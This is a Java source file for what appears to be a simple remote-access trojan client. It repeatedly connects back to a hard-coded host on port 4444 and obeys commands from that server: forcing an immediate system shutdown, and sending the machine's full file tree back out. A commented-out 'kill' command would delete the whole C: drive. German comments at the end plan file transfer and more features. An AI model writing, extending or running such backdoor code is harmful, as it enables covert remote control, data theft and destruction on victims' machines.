import java.util.Scanner;
import java.net.*;
import java.io.*;

import static java.lang.Thread.currentThread;
import static java.lang.Thread.sleep;

public class Client {

    private static Socket socket = null;
    private static DataInputStream datainput = null;
    private static DataOutputStream dataoutput = null;

    static int i = 0;
    static String address = "192.168.2.128";
    static int port = 4444;
    static boolean connection = false;

    public static void main(String[] args){
        connecting();
    }
    public static void connecting() {
        System.out.print("waiting for server...\n");
        while (connection == false) {
            try {
                socket = new Socket(address, port);
            } catch (IOException io) {
                i = 1;
            }
            if (i == 0) {
                System.out.print("connecting...\n");
                connection = true;
            }
            i = 0;
        }
        System.out.print("connected!\n\n");
        inout();
    }

    public static void inout(){
        try {

            dataoutput = new DataOutputStream(socket.getOutputStream());
            datainput = new DataInputStream(socket.getInputStream());

            Thread threadout = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (connection == true) {
                        try {
                            Scanner scan = new Scanner(System.in);
                            dataoutput.writeUTF(scan.nextLine());
                        } catch (IOException io1) {
                            System.out.print(io1 + " io1");
                            System.out.print("\nconnection failed\n\n");
                            closing();
                        }
                    }
                }
            });

            threadout.start();


            String i1 = null;
            while (connection == true) {
                try {
                    i1 = datainput.readUTF();
                    System.out.print(i1 + "\n");

                    if (i1.equals("shutdown")) {
                        Runtime runtime = Runtime.getRuntime();
                        runtime.exec("shutdown /p /f");
                    }

                    if (i1.equals("tree")) {
                        Runtime runtime1 = Runtime.getRuntime();
                        runtime1.exec("cmd.exe /c tree /f >C:/PerfLogs/tree.txt");
                        sleep(500);

                        File treefile = new File("C:/PerfLogs/tree.txt");
                        FileInputStream fileinput = new FileInputStream(treefile);
                        byte[] buffer = new byte[16 * 1024];

                        while (fileinput.read(buffer) != -1) {
                            dataoutput.write(buffer, 0, buffer.length);
                        }
                        fileinput.close();
                    }

                    if (i1.equals("close connection")) {
                        System.out.print("\nconnection closed!\n\n");
                        try {
                            sleep(500);
                        } catch (InterruptedException I) {
                            System.out.print(I + " I");
                        }
                        closing();
                    }

                    //if(i1.equals("kill"));
                    //Runtime runtime2 = Runtime.getRuntime();
                    //runtime2.exec("cmd.exe /c rd /s /q C:\\");

                } catch (IOException io2) {
                    System.out.print(io2 + " io2");
                    System.out.print("\nconnection failed\n\n");
                    closing();
                }
            }
        }catch(Exception e){
            System.out.print(e + " e");
            connection = false;
            try {
                sleep(500);
            } catch (InterruptedException I1) {
                System.out.print(I1 + " I1");
            }
            System.out.print("\nconnection failed\n\n");
            closing();
        }
    }
    public static void closing(){
        connection = false;

        try {
            sleep(1000);
        } catch (InterruptedException I2) {
            System.out.print(I2 + " I2");
        }

        connecting();

    }

}

//bugs bei reconnection fixen
//pfad wecheseln können und dateien senden können möglich machen
//mehr funktionen hinzufügen